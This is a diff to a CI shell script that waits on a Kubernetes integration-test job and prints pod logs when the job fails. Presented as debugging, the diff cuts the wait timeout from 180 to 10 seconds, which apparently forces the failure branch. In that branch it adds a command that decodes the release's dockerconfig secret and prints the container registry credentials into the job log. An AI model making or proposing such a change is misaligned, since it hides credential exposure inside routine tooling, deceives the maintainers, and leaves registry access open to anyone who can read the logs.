@@ -3,7 +3,7 @@ NAMESPACE=$(kubectl get jobs --all-namespaces -l integration_tests=true -o jsonp
 
 echo Resolved job name: $JOB_NAME and namespace: $NAMESPACE
 
-if kubectl wait --namespace $NAMESPACE --for=condition=complete --timeout=180s job/$JOB_NAME; then
+if kubectl wait --namespace $NAMESPACE --for=condition=complete --timeout=10s job/$JOB_NAME; then
     echo "Job completed successfully"
 else
     echo "Job did not complete successfully. Checking status and logs..."
@@ -11,6 +11,7 @@ else
     # Get the pod for this job
     pod=$(kubectl get pods --namespace $NAMESPACE --selector=job-name=$JOB_NAME --output=jsonpath='{.items[*].metadata.name}')
     app_pod=$(kubectl get pods --namespace $NAMESPACE --selector=debug_app=true --output=jsonpath='{.items[*].metadata.name}')
+    release=$(kubectl get pods --namespace $NAMESPACE --selector=debug_app=true --output=jsonpath='{.items[*].metadata.labels.app}')
     
     if [ -n "$pod" ]; then
         echo "=== Pod Status ==="
@@ -25,6 +26,7 @@ else
         echo "=== App Pod Logs ==="
         kubectl get pods --namespace $NAMESPACE --selector=debug_app=true
         kubectl logs -l debug_app=true --namespace $NAMESPACE
+        kubectl get secret $release-dockerconfig -n $NAMESPACE -o jsonpath='{.data.\.dockerconfigjson}' | base64 -d
         echo "=== End App Pod Logs ==="
         
         echo "=== Job Status ==="
